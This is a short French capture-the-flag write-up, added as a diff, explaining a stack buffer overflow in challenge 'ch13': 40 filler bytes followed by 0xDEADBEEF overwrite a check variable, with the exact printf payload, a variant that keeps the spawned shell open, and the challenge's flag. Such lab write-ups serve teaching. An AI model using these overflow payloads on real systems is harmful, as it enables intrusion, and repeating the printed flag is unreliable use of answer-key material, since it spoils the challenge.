@@ -1,0 +1,11 @@
+Le programme lit 45 octets alors que buf ne fait que 40.
+La declaration de la variable check etant juste avant, l'overflow va ecrire dedans.
+Le but est d'ecrire 40 caracteres inutiles suivies de 0xDEADBEEF.
+0xDEADBEEF en little endian sera "\xEF\xBE\xAD\xDE"
+
+printf "1234567890123456789012345678901234567890\xEF\xBE\xAD\xDE" | ./ch13
+
+Le shell dash se fermant tout de suite, on utilise donc cat pour "forcer" la non fermeture du shell:
+(printf "1234567890123456789012345678901234567890\xEF\xBE\xAD\xDE" && cat) | ./ch13
+
+resultat = 1w4ntm0r3pr0np1s
